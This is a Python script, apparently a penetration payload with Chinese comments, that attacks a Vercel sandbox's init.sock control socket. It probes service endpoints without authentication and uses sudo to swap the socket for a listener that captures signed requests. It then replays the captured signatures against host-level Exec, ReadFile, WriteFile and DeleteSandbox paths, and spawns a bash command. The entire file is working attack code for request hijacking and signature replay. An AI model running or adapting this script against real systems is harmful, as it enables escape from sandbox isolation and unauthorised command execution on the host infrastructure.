# -*- coding: utf-8 -*-
"""v211 payload: init.sock 服务枚举 + 签名跨路径测试
1. 无签名探测候选路径 -> 404 / missing-signature / 其他 分类
2. hook 捕获 2 个合法请求 (ts, sig)
3. 恢复 socket
4. 用 (ts, sig) 请求所有"存在"路径 -> 若成功则签名不绑定 path(严重性提升)
5. 对照: (ts, sig) 请求 Spawn 应成功; 改 ts 应失败
"""
import socket, time, os, subprocess, signal

signal.alarm(280)
SOCKPATH = '/run/vercel/share/init.sock'
BAK = SOCKPATH + '.bak'
LOG = '/vercel/sandbox/v211.log'
f = open(LOG, 'w', encoding='utf-8', errors='replace')
SPAWN = '/vercel.sandbox.spawn.v1.SpawnService/Spawn'


def log(s):
    line = '[%.1f] %s' % (time.time(), s)
    f.write(line + '\n')
    f.flush()
    print(line, flush=True)


def recv_more(conn, timeout):
    try:
        conn.settimeout(timeout)
        return conn.recv(65536)
    except Exception:
        return b''


def read_http(conn, timeout=4):
    conn.settimeout(timeout)
    d = b''
    while b'\r\n\r\n' not in d:
        x = recv_more(conn, timeout)
        if not x:
            break
        d += x
        if len(d) > 300000:
            break
    if b'\r\n\r\n' not in d:
        return d
    head, _, rest = d.partition(b'\r\n\r\n')
    try:
        cl = 0
        for ln in head.split(b'\r\n')[1:]:
            if ln.lower().startswith(b'content-length:'):
                cl = int(ln.split(b':', 1)[1].strip())
        while len(rest) < cl:
            x = recv_more(conn, timeout)
            if not x:
                break
            rest += x
    except Exception:
        pass
    return head + b'\r\n\r\n' + rest[:cl]


def varint(n):
    out = b''
    while True:
        b = n & 0x7F
        n >>= 7
        if n:
            out += bytes([b | 0x80])
        else:
            return out + bytes([b])


def proto_str(field, s):
    b = s.encode() if isinstance(s, str) else s
    return bytes([field << 3 | 2]) + varint(len(b)) + b


def build_body(command, args, cwd='/vercel/sandbox'):
    proto = proto_str(1, command)
    for a in args:
        proto += proto_str(2, a)
    proto += proto_str(4, cwd)
    return b'\x00\x00\x00\x00' + bytes([len(proto)]) + proto


def build_req(path, ts, sig, body):
    h = ('POST %s HTTP/1.1\r\nHost: localhost\r\nUser-Agent: connect-go/1.20.0 (go1.25.14)\r\n' % path).encode()
    h += b'Content-Length: %d\r\nAccept-Encoding: identity\r\nConnect-Accept-Encoding: gzip\r\n' % len(body)
    h += b'Connect-Protocol-Version: 1\r\nContent-Type: application/connect+proto\r\n'
    if ts is not None:
        h += b'X-Signature: %s\r\nX-Timestamp: %s\r\n' % (sig.encode(), ts.encode())
    h += b'\r\n'
    return h + body


def punix(req, t=3):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(SOCKPATH)
        s.sendall(req)
        d = b''
        while True:
            x = s.recv(65536)
            if not x:
                break
            d += x
            if len(d) > 8000:
                break
        s.close()
        return d[:2000]
    except Exception as e:
        return ('EXC:%s' % e).encode()[:200]


def classify(resp):
    """响应分类: 404 / missing-sig / invalid-sig / 200 / other"""
    if b'EXC' in resp[:10]:
        return 'EXC'
    first = resp.split(b'\r\n', 1)[0].decode(errors='replace')
    low = resp.lower()
    if b'404' in first:
        return '404'
    if b'missing signature' in low:
        return 'MISSIG'
    if b'invalid signature' in low:
        return 'INVSIG'
    if b'200' in first:
        return '200'
    return 'OTHER:' + first


# ---------- 1. 无签名探测 ----------
log('=== phase1: no-sig probe ===')
try:
    for ln in subprocess.run(['bash', '-c', 'ls -la /run/vercel/share/ /run/vercel/ 2>&1'], capture_output=True, timeout=5).stdout.decode(errors='replace').splitlines():
        log('LS ' + ln)
except Exception:
    pass

paths = [
    '/grpc.health.v1.Health/Check',
    '/grpc.health.v1.Health/ListServices',
    SPAWN,
    '/vercel.sandbox.spawn.v1.SpawnService/Stop',
    '/vercel.sandbox.spawn.v1.SpawnService/Kill',
    '/vercel.sandbox.spawn.v1.SpawnService/ListProcesses',
    '/vercel.sandbox.snapshot.v1.SnapshotService/CreateSnapshot',
    '/vercel.sandbox.snapshot.v1.SnapshotService/DeleteSnapshot',
    '/vercel.sandbox.snapshot.v1.SnapshotService/ListSnapshots',
    '/vercel.sandbox.exec.v1.ExecService/Exec',
    '/vercel.sandbox.process.v1.ProcessService/Spawn',
    '/vercel.sandbox.process.v1.ProcessService/Kill',
    '/vercel.sandbox.fs.v1.FileSystemService/ReadFile',
    '/vercel.sandbox.fs.v1.FileSystemService/WriteFile',
    '/vercel.sandbox.fs.v1.FileSystemService/ListDir',
    '/vercel.sandbox.v1.SandboxService/GetSandbox',
    '/vercel.sandbox.v1.SandboxService/DeleteSandbox',
    '/vercel.sandbox.host.v1.HostService/ReadFile',
    '/vercel.sandbox.host.v1.HostService/Exec',
    '/vercel.sandbox.host.v1.HostService/WriteFile',
    '/vercel.sandbox.vm.v1.VMService/ReadFile',
    '/vercel.sandbox.vm.v1.VMService/Exec',
    '/vercel.sandbox.agent.v1.AgentService/Exec',
    '/vercel.sandbox.metrics.v1.MetricsService/GetMetrics',
    '/vercel.sandbox.config.v1.ConfigService/GetConfig',
]
found = []
for p in paths:
    rp = punix(build_req(p, None, '', b''), t=2)
    c = classify(rp)
    log('PROBE %-70s %s' % (p, c))
    if c in ('MISSIG', 'INVSIG', '200'):
        found.append(p)
    time.sleep(0.1)

# ---------- 2. hook 捕获 ----------
log('=== phase2: hook ===')
r = subprocess.run(['sudo', '-n', 'mv', SOCKPATH, BAK], capture_output=True, timeout=5)
log('MV rc=%d' % r.returncode)
try:
    os.unlink(SOCKPATH)
except Exception:
    pass
srv = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
srv.bind(SOCKPATH)
srv.listen(16)
srv.settimeout(1)
log('HOOK LISTENING')

captured = []
hook_end = time.time() + 40
while time.time() < hook_end and len(captured) < 2:
    try:
        c, _ = srv.accept()
    except socket.timeout:
        continue
    except Exception as e:
        log('ACCEPT EXC %s' % e)
        break
    req = read_http(c, 5)
    head = req.split(b'\r\n\r\n', 1)[0]
    hdrs = {}
    for ln in head.split(b'\r\n')[1:]:
        if b':' in ln:
            k, v = ln.split(b':', 1)
            hdrs[k.strip().lower()] = v.strip()
    ts = hdrs.get(b'x-timestamp', b'').decode(errors='replace')
    sig = hdrs.get(b'x-signature', b'').decode(errors='replace')
    if ts and sig:
        captured.append((ts, sig))
        log('CAPTURED %d ts=%s siglen=%d' % (len(captured), ts, len(sig)))
    c.close()

srv.close()
try:
    os.unlink(SOCKPATH)
except Exception:
    pass
r = subprocess.run(['sudo', '-n', 'mv', BAK, SOCKPATH], capture_output=True, timeout=5)
log('RESTORE rc=%d captured=%d' % (r.returncode, len(captured)))

# ---------- 3. 签名跨路径测试 ----------
log('=== phase3: sig cross-path ===')
if captured:
    ts, sig = captured[0]
    # 对照1: Spawn 用原始 body -> 应成功
    body = build_body('bash', ['-c', 'echo V211-CTRL-OK > /tmp/v211_ctrl'])
    rp = punix(build_req(SPAWN, ts, sig, body), t=5)
    log('CTRL spawn -> %s %r' % (classify(rp), rp[:150]))
    # 对照2: 改 ts -> 应失败
    badts = str(int(ts) + 1)
    rp = punix(build_req(SPAWN, badts, sig, body), t=5)
    log('CTRL badts -> %s %r' % (classify(rp), rp[:150]))
    # 跨路径: 用合法 (ts,sig) 请求所有 found 路径
    for p in found:
        if p == SPAWN:
            continue
        rp = punix(build_req(p, ts, sig, b''), t=4)
        log('CROSS %-70s %s %r' % (p, classify(rp), rp[:150]))
    # 写文件验证 spawn 真执行
    for fn in ['/tmp/v211_ctrl']:
        try:
            if os.path.exists(fn):
                log('FILE %s EXISTS: %r' % (fn, open(fn).read()))
            else:
                log('FILE %s MISSING' % fn)
        except Exception as e:
            log('FILE %s EXC %s' % (fn, e))
log('V211_DONE')
f.close()
